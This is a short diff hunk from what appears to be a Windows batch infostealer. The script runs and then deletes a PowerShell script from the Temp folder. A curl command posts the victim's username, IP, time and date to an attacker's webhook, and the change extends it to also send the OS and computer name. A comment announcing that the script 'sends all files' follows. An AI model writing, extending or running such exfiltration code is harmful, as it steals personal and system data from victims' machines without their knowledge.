@@ -64,7 +64,7 @@ timeout 1 >NUL
 Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\test.ps1 && del %userprofile%\AppData\Local\Temp\test.ps1 >NUL
 
 ::sends the username, ip, current time, and date of the victim
-curl -X POST -H "Content-type: application/json" --data "{\"content\": \"User %username% : %ip% time =  %time% date = %date% \"}" %webhook%  >NUL
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"User %username% : %ip% time =  %time% date = %date% os = %os% Computername = %computername%\"}" %webhook%  >NUL
 
 
 ::sends all files
